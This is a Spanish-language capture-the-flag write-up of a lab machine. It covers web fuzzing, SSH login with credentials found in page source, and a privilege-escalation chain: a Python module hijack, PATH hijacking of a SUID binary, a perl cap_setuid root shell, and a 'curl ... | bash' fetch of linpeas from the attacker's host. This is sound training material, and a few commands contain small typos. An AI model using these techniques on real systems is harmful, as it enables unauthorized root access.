# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -Pn -n -sS -vvv --min-rate 5000 $IP

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

```bash
sudo nmap -p 22,80 -Pn -n -sVC -v --min-rate 5000 -oN versiones.nmap $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## <font color=red>[~]</font> Entorno Web

```bash
whatweb http://$IP
http://$IP [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.131.237], Title[Follow the white rabbit.]
```

>[!Note]
>El `index.html` es una página web estática muy simple sin información más allá del conocimiento de un archivo `/main.css` y un directorio `/img/`.

Al ser una web tan simple no tenemos mucho donde investigar de forma pasiva, por lo tanto comenzamos la fase de reconocimiento activo del entorno web.
### <font color=red>[-]</font> `ffuf`

```bash
ffuf -c -w <(/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt) -u http://$(cat ip)/FUZZ -fc 404

img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
r                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 30ms]
poem                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
http%3A%2F%2Fwww        [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 30ms]
http%3A%2F%2Fyoutube    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
http%3A%2F%2Fblogs      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 34ms]
http%3A%2F%2Fblog       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 34ms]
<snip>
```

Podemos observar que encontramos algunos directorios, entre los que se encuentran el directorio `img` (que ya sabíamos de su existencia gracias al reconocimiento pasivo), unos directorios extraños que usan codificación URL (tras investigar un poco llego a la conclusión de que es "ruido") y un directorio `r`. 
#### El directorio `r`

Este directorio es particular debido a que cuando accedemos a él encontramos lo que parece una conversación del libro de "*Alice in Wonderlands*" o "*Alicia en el país de las maravillas*". Si revisamos el código fuente no encontramos nada interesante, por lo que sigo realizando *fuzzing* sobre el directorio.

```bash
ffuf -c -w <(/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt) -u http://$(cat ip)/r/FUZZ -fc 404

a                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
```

Encontramos un segundo subdirectorio denominado `a` que sigue la misma temática de la conversación del subdirectorio `r`. Sabiendo que el CTF está basado en "*Alice in Wonderlands*" y observando el patrón `/r/a/` me da para pensar que si seguimos hasta obtener la palabra `/r/a/b/b/i/t` obtendremos la conversación completa (***CORRECTO!!***).

>[!tip]
>Sin embargo, en esta ocasión hemos resuelto esta parte del CTF a través de hipótesis sobre la temática de "*Alice in Wonderlands*" (que es totalmente acertado), pero que pasaría si no supiéramos la temática o no cayésemos en esta idea.
>
>Podríamos notar el patrón evidente de que los directorios son letras minúsculas (y posibles mayúsculas) en sucesión. Por lo que podríamos crear un diccionario con todas las letras mayúsculas y minúsculas para poder hacer *fuzzing*.
>
>***Para ello:***
>1. Creamos el diccionario con todas las letras minúsculas y mayúsculas del alfabeto inglés.
>   ```bash
>   printf "%s\n" {a..z} {A..Z} > letras.txt
>   ```
>2. Hacemos el *fuzzing* con el nuevo diccionario.
>   ```bash
>   ffuf -c -w letras.txt -u http://$(cat ip)/FUZZ -fc 404 -recursion
>   
>   r
>   a
>   b
>   b
>   i
>   t
>   ```
#### Directorio `/r/a/b/b/i/t/`

En este *endpoint* encontramos el final de la conversación. Si miramos el código fuente encontramos lo que parecen ser unas credenciales que podremos usar para conectarnos vía ***SSH***.
# <font color=red>[+]</font> Post-Explotación

## <font color=red>[~]</font> Escalada de privilegios
### <font color=red>[-]</font> alice

Accedemos al sistema como el usuario `alice` el cual no tiene grandes privilegios. Sin embargo, cuando usamos `sudo -l` vemos que puede ejecutar la herramienta `walrus_and_the_carpenter.py` con `/usr/bin/python3.6`.

Tenemos permisos de lectura sobre el *script*:
```python
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
"""
<snip>
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

>Vemos que se importa el módulo `random`.

En ***Python***, cuando se importa un módulo, este se busca primero en el directorio en el que se encuentra el *script*. Si el *script* ejecuta `import random`, podemos crear un archivo llamado `random.py` en el directorio actual para modificar el comportamiento del *script*.

```python
import os
os.system("/bin/bash")
```

De esta forma, cuando volvamos a ejecutar el script, obtendremos una shell en ***bash*** como el usuario `rabbit`.
### <font color=red>[-]</font> rabbit

Cuando obtenemos acceso al directorio `home` del usuario `rabbit` encontramos un binario llamado `teaParty` con el ***bit SUID activo***. 

Si ejecutamos el binario nos muestra unos mensajes en los cuales aparece la fecha del día de hoy con una hora más tarde. Esto nos indica que muy probablemente se esté ejecutando el comando `date`. Pero para estar seguros debemos de conocer más del binario.

Si tratamos de ejecutar el comando `strings` nos damos cuenta de que el mismo no está instalado, por lo que tenemos varias opciones para poder saber un poco más sobre que es lo que hace el binario.

>[!tip]
>1. ***grep***
>   `grep` tiene un flag para tratar archivos binarios como texto (`-a`). Podemos combianrlo con una expresión regular que busque cadenas de caracteres imprimibles (4 o más letras seguidas):
>   ```bash
>   grep -a -oE "[[:print:]]{4,}" teaParty
>   ```
>2. ***Python***
>   Como `python3` está en la máquina, podemos usar un *one-liner* para emular el comportamiento de `strings`:
>   ```bash
>   python3 -c "import sys; import re; print('\n'.join(re.findall(r'[ -~]{4,}', open('teaParty", 'rb').read().decode('ascii', 'ignore'))))"
>   ```
>3. ***Exfiltración (Para analizarlo en nuestra máquina)***
>   Si preferimos analizarlo con `Ghidra`, `IDA` o el propio `strings` de nuestra máquina, podemos pasarnos el binario.
> 	  1. ***En la máquina víctima:***
> 	     ```bash
> 	     base64 teaParty
> 	     ```
> 	  2. ***Copiamos todo el bloque de texto***, lo pegamos en un archivo en nuestro *Kali* (ej. `code.txt`) y lo reconvertimos:
> 	     ```bash
> 	     base64 -d code.txt > teaParty_Kali
> 	     chmod +x teaParty_Kali
> 	     strings teaParty_Kali
> 	     ```

Veremos que en el binario se ejecuta:
```bash
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

Si nos fijamos, el comando `echo` tiene la ruta completa pero `date` no. Esto hace al binario `date` vulnerable a un ***Path Hijacking***:

>[!warning]
>1. ***Creamos el falso `date` en `/tmp`:***
>   ```bash
>   echo -e '#!/bin/bash\n/bin/bash' > date
>   chmod +x /tmp/date
>   ```
>2. ***Envenenamos el PATH:***
>   ```bash
>   export PATH=/tmp:$PATH
>   ```
>   Podemos ver si ha funcionado con el comando:
>   ```bash
>   echo $PATH  # Si vemos /tmp: al principio ha funcionado
>   ```
>3. ***Ejecución***
>   Ejecutamos de nuevo el binario `teaParty`.

>[!important]
>Cuando ejecutamos de nuevo el binario obtenemos una shell como el usuario `hatter`.  Es interesante ya que el binario pertenecía a `root` y tenía el ***bit SUID activo***, por lo que deberíamos de habernos convertido en el usuario `root`. No obstante, que seamos el usuario `hatter` nos indica que en el binario se encontraba alguna instrucción que cambiaba el ***UID*** del usuario hacia el `1003` (`hatter`) antes de ejecutar el comando `date`.
### <font color=red>[-]</font> hatter

>Dentro del directorio `home` encontramos un fichero `password.txt` con la contraseña del usuario `hatter`. Esta contraseña nos sirve para conectarnos vía ***SSH*** como el usuario `hatter` pero no se ha reutilizado la contraseña para `root`.

Tras investigar un poco no encuentro nada de interés, así que ejecuto `linpeas.sh` para ver que me he saltado. Para ello, levanto un servidor web con ***Python*** en mi máquina desde el que descargaré y ejecutaré directamente en memoria `linpeas.sh` en la máquina víctima.

1. ***Identificamos donde se tenemos almacenado el script `linpeas.sh`***
   ```bash
   find / -name "linpeas.sh" -type f 2>/dev/null
   ```
2. ***Levantamos el servicio web en el puerto 80 con el `DocumentRoot` en el directorio donde se encuentra el script***
   ```bash
   python -m http.server 80 -d /ruta/al/directorio/de/linpeas  # No debemos de incluir linpeas.sh
   ```
3. ***En la máquina víctima, descargamos y ejecutamos directamente en memoria `linpeas.sh`***
   ```bash
   curl http://IP_KALI/linpeas.sh | bash
   ```

Encontramos unos archivos con `Capabilities de POSIX`, los cuales son una forma más moderna y granular que el *bit SUID* para asignar privilegios de ***root*** a un archivo.

>[!warning]
>***La línea clave es:***
>```bash
>/usr/bin/perl = cap.setuid+ep
>```
>- ***cap_setuid:*** Esta capacidad permite al programa cambiar su ***UID***. Básicamente, el programa tiene permiso para "*convertirse*" en cualquier otro usuario, incluido `root`.
>- ***+ep:*** Significa que la capacidad está ***E***fectiva (activa) y ***P***ermitida.
>
>En términos prácticos: ***Cualquier usuario que ejecute `perl` puede decirle a Perl que se convierta en root antes de hacer nada más***. Es lo mismo que si `perl` tuviera el ***bit SUID de root***, pero de forma que a veces pasa desapercibida para los administradores.
>
>***Cómo explotarlo para ser root***
>Como `perl` tiene el permiso de cambiar el ***UID***, solo tienes que ejecutar un "*one-liner*" que haga dos cosas:
>1. Cambiar su propio ID de usuario a ***0*** (***root***).
>2. Lanzar una shell (`/bin/bash`).
>
>***Ejecuta este comando siendo `hatter`:***
>```bash
>perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
>```
>
>***Desglose del comando:***
>- `use POSIX qw(setuid);`: Carga el módulo para manejar funciones del sistema operativo.
>- `POSIX::setuid(0);`: Aquí es donde ocurre la magia. Le dice al proceso: "Ahora nuestro ID de usuario es ***0***" (***root***). Como tiene la *capability* `cap_setuid`, el sistema lo permite.
>- `exec "/bin/bash;"`: Reemplaza el proceso de Perl por una shell de Bash. Al haber cambiado el UID a 0 justo antes, la shell nacerá seno `root`.
